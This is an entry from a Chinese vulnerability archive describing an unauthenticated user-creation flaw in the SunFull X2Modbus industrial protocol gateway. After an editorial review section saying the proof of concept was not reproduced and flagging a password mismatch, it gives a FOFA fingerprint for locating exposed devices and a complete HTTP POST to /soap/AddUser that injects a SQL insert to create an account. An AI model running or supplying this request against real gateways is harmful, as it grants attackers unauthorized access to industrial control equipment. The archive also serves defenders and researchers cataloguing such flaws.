---
source: "wy876 漏洞文库"
id: "vw-3f11231c453442c4174472b3"
entity_id: "ve-3f11231c453442c4174472b3"
schema_version: "1"
fofa_unverified: "server="
title: "上海迅饶自动化科技有限公司X2Modbus网关任意用户添加漏洞"
product: "SunFull迅饶X2Modbus"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "语言Cookie，PURVIEW=1角色含义未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/%E8%BF%85%E9%A5%B6%E8%87%AA%E5%8A%A8%E5%8C%96/%E4%B8%8A%E6%B5%B7%E8%BF%85%E9%A5%B6%E8%87%AA%E5%8A%A8%E5%8C%96%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8X2Modbus%E7%BD%91%E5%85%B3%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "账户操作会新增用户或更改认证材料，可能使原用户失去访问；须核对角色、操作前账户状态及恢复路径"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/lyagwfg3rha3y0xp"
source_status: "recorded"
---

# 上海迅饶自动化科技有限公司X2Modbus网关任意用户添加漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：SunFull迅饶X2Modbus
- 本文讨论：soap/AddUser未授权操作
- 版本、权限与配置前提：语言Cookie，PURVIEW=1角色含义未知
- 资料类型：用户新增请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- SQL设置密码stc123456，后文却称stc/stc登录，确定不一致
- 原始SQL作为text/xml体缺协议解释和成功响应；FOFA字段残缺
- 历史校订意见（原始示例按归档保留，下述改写不再应用于原始示例）：“使用添加的账户`stc/stc`登录系统”改为“请求设置的测试账户为 `stc/stc123456`；此处按 SQL 中的值统一，创建与登录成功仍需响应证据”；HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。以上意见置于原始示例之外，不覆盖原文证据；未做运行验证

### 操作风险与恢复

- 账户操作会新增用户或更改认证材料，可能使原用户失去访问；须核对角色、操作前账户状态及恢复路径

### 待核与来源

- 无认证新增、角色及版本待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
X2Modbus是上海迅饶自动化科技有限公司开发的一款功能很强大的协议转换网关， 这里的X代表各家不同的通信协议， 2是To的谐音表示转换， Modbus就是最终支持的标准协议是Modbus协议。用户可以根据现场设备的通信协议进行配置，转成标准的Modbus协议。在PC端仿真运行无误后，上传到硬件协议转换网关。上海迅饶自动化科技有限公司X2Modbus网关任意用户添加漏洞

# 二、影响版本
+ X2Modbus

# 三、资产测绘
+ fofa`server="SunFull-Webs" || icon_hash="-1384370370"`
+ 特征


# 四、漏洞复现
```http
POST /soap/AddUser HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: application/xml, text/xml, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
X-Requested-With: XMLHttpRequest
Content-Length: 111
Connection: close
Referer: 
Cookie: language=zh-cn; language=zh-cn

insert into userid (USERNAME,PASSWORD,PURVIEW,LOGINDATE,LOGINTIME) values('stc','stc123456','1','2024-4-8','0:31:43')
```


使用添加的账户`stc/stc`登录系统

> 校订说明：请求设置的测试账户为 `stc/stc123456`，与上方原文的 `stc/stc` 不一致；两处原值分别保留，创建与登录成功未独立验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lyagwfg3rha3y0xp>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
